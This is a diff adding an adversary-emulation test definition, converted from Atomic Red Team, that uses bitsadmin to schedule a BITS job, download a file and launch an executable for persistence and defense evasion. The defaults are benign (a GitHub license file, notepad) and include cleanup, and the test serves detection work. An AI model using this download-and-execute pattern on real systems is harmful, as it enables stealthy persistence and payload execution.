@@ -1,0 +1,61 @@
+# Converted from Atomic Red Team - BITS Jobs
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1197
+# Original auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
+
+---
+api_version: 2.0
+uuid: 0057b467-3d26-4783-98fe-1e2fe1a45cbe
+name: Persist, Download, & Execute
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer and execute a payload in multiple steps.
+  Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsadmin to run an executable.
+  This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+  This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
+
+mitre:
+  tactics:
+    - "TA0003 Persistence"
+    - "TA0005 Defense Evasion"
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1197 BITS Jobs"
+
+requirements:
+  platforms:
+    - os: windows
+
+args:
+  - name: command_path
+    description: Path of command to execute
+    type: path
+    default: "C:\\Windows\\system32\\notepad.exe"
+  - name: bits_job_name
+    description: Name of BITS job
+    type: string
+    default: "AtomicBITS"
+  - name: local_file
+    description: Local file path to save downloaded file
+    type: path
+    default: "C:\\Windows\\Temp\\bitsadmin3_flag.ps1"
+  - name: remote_file
+    description: Remote file to download
+    type: string
+    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.md"
+
+steps:
+  - name: create_and_execute_bits_job
+    executor: cmd.exe
+    inline: |
+      bitsadmin.exe /create {{.Args.bits_job_name}}
+      bitsadmin.exe /addfile {{.Args.bits_job_name}} {{.Args.remote_file}} {{.Args.local_file}}
+      bitsadmin.exe /setnotifycmdline {{.Args.bits_job_name}} {{.Args.command_path}} NULL
+      bitsadmin.exe /resume {{.Args.bits_job_name}}
+      ping -n 5 127.0.0.1 >nul 2>&1
+      bitsadmin.exe /complete {{.Args.bits_job_name}}
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        del {{.Args.local_file}} >nul 2>&1
